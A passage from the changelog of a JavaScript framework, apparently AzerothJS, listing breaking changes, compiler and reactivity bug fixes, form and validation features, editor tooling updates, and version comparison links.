- Markup lint with autofix: spacing/punctuation rules for `.azeroth` interpolations
  run in the compiler's build-time lint and through the ESLint processor, and are
  fixable with `eslint --fix`.

### Changed

- **BREAKING:** `azerothjs` (unscoped) is now the framework's entry package and the
  compiler's code-generation target. Install `azerothjs` instead of `@azerothjs/core`
  and import from `'azerothjs'`; `@azerothjs/core` is removed and receives no further
  releases.
- **BREAKING:** a component with more than one top-level markup region is now a
  compile error (`azeroth/multiple-roots`). Previously every region except the last
  was silently discarded; wrap siblings in a single root element instead.
- Published type declarations are now compiled under `noUncheckedIndexedAccess`,
  `exactOptionalPropertyTypes`, and `isolatedDeclarations`: optional properties where
  absent and `undefined` mean the same thing are spelled `| undefined`, and indexed
  reads are guarded throughout the runtime.
- Validation rules (`required`, `email`, `phone`, the `countries` dataset, ...) moved
  to `@azerothjs/schema` as the single source of validation truth; `@azerothjs/form`
  re-exports them, so existing imports keep working.
- Mount points and route components are typed as `MountNode`
  (`HTMLElement | DocumentFragment`), so a component may render a fragment.
- Release flow publishes to npm before pushing the tag, so CI triggered by the push
  always finds the released versions on the registry.
- All READMEs rewritten for npm: root front page, `azerothjs` flagship page (now
  covering the server side), and per-package pages with install instructions;
  non-ASCII punctuation removed from authored text repo-wide.

### Fixed

- Compiler: a markup child expression starting on the line after its opening `{`
  compiled to a bare `return;` (JavaScript ASI), silently dropping the child - the
  classic symptom was `<For>` failing with "renderItem is not a function". Generated
  returns are parenthesized now, with a regression test.
- Reactivity: a truthy non-function value returned from an effect body (for example
  `createEffect(() => list.push(x))` - `push` returns a number) was registered as a
  cleanup and crashed the next run's cleanup pass; non-function returns are ignored.
- `.azeroth` parser: HTML comments (`<!-- -->`) now fail with a specific, actionable
  message instead of a generic markup parse error.
- Compiler README documented the explicit-dependency effect as `watch (deps)`; the
  keyword is `effect (deps)`.

## [0.7.0-beta.1] - 2026-07-02

### Added

- `form` keyword: first-class forms in `.azeroth` (`form f = shape with { ... }`),
  including the array form `form rows[]` for dynamic lists of repeated sub-forms.
- Form engine: cross-field validation (`validateForm`), per-field async validation
  (`validateAsync` with AbortSignal + debounce), numeric field coercion, and
  `createFieldArray`.
- Cross-language editor intelligence: Find References / Go to Definition / Rename
  across the `.ts` and `.azeroth` boundary in both editors, with result spans mapped
  to real source positions.
- `reactive` semantic-token modifier: names declared by reactive keywords get a
  distinct, themeable color in VS Code and JetBrains.
- JetBrains: usage-aware inspections (a `.ts` export used only from `.azeroth` files
  is no longer flagged unused) and `.azeroth`-aware Find Usages.
- Generated type projections (`.azeroth/types` mirror with declaration maps) so
  editors without tsserver-plugin support resolve `.azeroth` imports with full types.
- CI: editor plugins built, verified (JetBrains Plugin Verifier), and attached to
  GitHub Releases; typecheck and coverage gates.

### Changed

- **BREAKING:** published packages require Node >= 24.
- `props {}` blocks removed: component props are standard TypeScript parameters.
- `watch` folded into `effect (deps)`; `bind:` on components lowers to
  `value` + `on<Prop>Change`.

## [0.6.0-beta.1] - 2026-06-21

- Component-only `.azeroth` authoring model, unified compiler IR, and the rebuilt
  editor tooling stack (language service, language server, VS Code extension,
  JetBrains plugin, tsserver plugin, ESLint processor).

[Unreleased]: https://github.com/AzerothJS/AzerothJS/compare/v2.1.0-beta.2...HEAD
[2.1.0-beta.2]: https://github.com/AzerothJS/AzerothJS/compare/v2.1.0-beta.1...v2.1.0-beta.2
[2.1.0-beta.1]: https://github.com/AzerothJS/AzerothJS/compare/v2.0.0-beta.2...v2.1.0-beta.1
[2.0.0-beta.2]: https://github.com/AzerothJS/AzerothJS/compare/v2.0.0-beta.1...v2.0.0-beta.2
[2.0.0-beta.1]: https://github.com/AzerothJS/AzerothJS/compare/v1.1.0...v2.0.0-beta.1
[1.1.0]: https://github.com/AzerothJS/AzerothJS/compare/v1.0.0...v1.1.0
[1.0.0]: https://github.com/AzerothJS/AzerothJS/compare/v1.0.0-beta.2...v1.0.0
[1.0.0-beta.2]: https://github.com/AzerothJS/AzerothJS/compare/v1.0.0-beta.1...v1.0.0-beta.2
[1.0.0-beta.1]: https://github.com/AzerothJS/AzerothJS/compare/v0.9.0-beta.4...v1.0.0-beta.1
[0.9.0-beta.4]: https://github.com/AzerothJS/AzerothJS/compare/v0.9.0-beta.3...v0.9.0-beta.4
[0.9.0-beta.3]: https://github.com/AzerothJS/AzerothJS/compare/v0.9.0-beta.2...v0.9.0-beta.3
[0.9.0-beta.2]: https://github.com/AzerothJS/AzerothJS/compare/v0.9.0-beta.1...v0.9.0-beta.2
[0.9.0-beta.1]: https://github.com/AzerothJS/AzerothJS/compare/v0.8.0-beta.2...v0.9.0-beta.1
[0.8.0-beta.2]: https://github.com/AzerothJS/AzerothJS/compare/v0.8.0-beta.1...v0.8.0-beta.2
[0.8.0-beta.1]: https://github.com/AzerothJS/AzerothJS/compare/v0.7.0-beta.1...v0.8.0-beta.1
[0.7.0-beta.1]: https://github.com/AzerothJS/AzerothJS/compare/v0.6.0-beta.1...v0.7.0-beta.1
[0.6.0-beta.1]: https://github.com/AzerothJS/AzerothJS/releases/tag/v0.6.0-beta.1
